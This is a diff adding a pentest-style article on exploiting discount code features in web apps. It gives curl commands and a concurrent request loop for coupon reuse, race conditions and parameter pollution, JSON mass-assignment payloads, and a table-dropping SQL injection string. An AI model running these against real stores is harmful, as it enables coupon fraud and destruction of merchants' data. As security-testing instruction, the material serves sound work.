@@ -1,0 +1,124 @@
+---
+title: Discount Code Feature Testing for Web Apps
+description: Master discount code feature testing in web apps to identify vulnerabilities
+  and exploit unauthorized discounts.
+keywords:
+- discount code vulnerabilities
+- business logic flaws
+- race condition
+- mass assignment
+- coupon injection
+- HTTP parameter pollution
+- authorization bypass
+- reusable discount codes
+- web application security
+---
+
+# Discount Code Feature Testing
+
+## Context
+
+The purpose of this article is to enable offensive cybersecurity operators to identify and exploit business logic flaws within web applications' discount code features. This involves gaining unauthorized discounts or abusing the feature using various techniques. The reader is assumed to have foundational knowledge in HTTP requests, web application architecture, session management, and the concept of business logic errors.
+
+## Theory
+
+### Discount Code Feature Logic and Trust Boundaries
+
+Discount code features allow users to apply promotional codes during the checkout process to receive price reductions. These codes become vulnerable when business logic flaws occur, allowing discounts to be applied contrary to intended restrictions. Applications often trust client-supplied discount codes and parameters without adequate validation, making them susceptible to manipulation and exploitation.
+
+### Common Discount Code Vulnerabilities
+
+Reusable discount codes are exploitable if not restricted to single-use or specific users. Mass assignment vulnerabilities may allow attackers to set unauthorized discount-related fields. Race conditions can enable the multiple applications of a single-use code, HTTP parameter pollution might bypass discount validation logic, discounts may be improperly applied to restricted items, and coupon injection can make the application susceptible to attacks through manipulated inputs.
+
+### Attacker Workflow for Discount Code Feature Testing
+
+- Identify discount code entry points within checkout or cart APIs.
+- Test for code reuse, mass assignment flaws, and parameter manipulation opportunities.
+- Attempt concurrent requests to cause race conditions.
+- Analyze server responses to detect unauthorized or excessive discounts.
+
+## Practice
+
+### Reusable Discount Code Abuse
+
+- Capture a valid discount code and reuse it across multiple accounts to assess if improper restrictions are applied.
+  
+```bash
+curl -X POST https://target.com/api/checkout -d 'cart_id=123&discount_code=SUMMER2024' -b cookies.txt
+```
+
+Outcome: The discount code can be reused, leading to unauthorized discounts.
+
+### Mass Assignment for Unauthorized Discount Application
+
+- Intercept a checkout request and add unauthorized discount-related parameters to verify backend security posture.
+
+Payload:
+
+```json
+{
+    "cart_id": 123,
+    "discount_code": "SUMMER2024",
+    "discount_amount": 100
+}
+```
+
+Outcome: Attacker is able to set arbitrary discount values via mass assignment.
+
+### Coupon Race Condition Exploitation
+
+- Send multiple concurrent requests applying the same single-use code to trigger race conditions.
+
+Exploitation Script:
+
+```bash
+for i in {1..10}; do curl -X POST https://target.com/api/checkout -d 'cart_id=123&discount_code=RACE2024' & done; wait
+```
+
+Outcome: A single-use code is redeemed multiple times due to a race condition.
+
+### HTTP Parameter Pollution for Discount Bypass
+
+- Manipulate the request to include duplicate `discount_code` parameters and test backend logic.
+
+Command:
+
+```bash
+curl -X POST 'https://target.com/api/checkout?discount_code=SUMMER2024&discount_code=VIP2024' -b cookies.txt
+```
+
+Outcome: Multiple or unauthorized discounts are applied via parameter pollution.
+
+### Discount on Restricted Item Exploit
+
+- Apply a discount code to items that should be excluded, such as gift cards or premium products.
+
+Payload:
+
+```json
+{
+    "cart_id": 123,
+    "discount_code": "SUMMER2024",
+    "item_id": 999
+}
+```
+
+Outcome: The discount is applied to restricted items due to a lack of server-side validation.
+
+### Coupon Injection via Input Manipulation
+
+- Inject special characters or payloads into the discount code fields to check for input validation flaws.
+
+Payload:
+
+```
+SUMMER2024'; DROP TABLE coupons; --
+```
+
+Outcome: Potential for code or query injection via discount code input.
+
+## Tools
+
+- **Burp Suite**
+- **curl**
+- **OWASP ZAP**
